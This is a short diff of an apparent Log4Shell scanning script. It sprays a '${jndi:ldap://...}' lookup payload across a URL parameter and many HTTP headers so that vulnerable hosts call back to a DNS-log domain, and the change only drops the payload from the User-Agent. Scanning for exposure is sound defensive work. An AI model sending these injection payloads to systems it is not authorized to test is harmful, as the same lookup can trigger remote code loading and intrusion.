@@ -31,7 +31,7 @@ for url in urls:
     payload = '${jndi:ldap://' + ID + '.' + dnslog + '/a}'
     params = {'id': payload}
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko)' + payload,
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko)',
         'Referer': payload, 'CF-Connecting_IP': payload, 'True-Client-IP': payload, 'X-Host': payload,
         'X-Forwarded-For': payload, 'Originating-IP': payload, 'X-Real-IP': payload, 'Proxy-Client-IP': payload,
         'X-Client-IP': payload, 'Forwarded': payload, 'Forwarded-For': payload, 'Client-IP': payload,
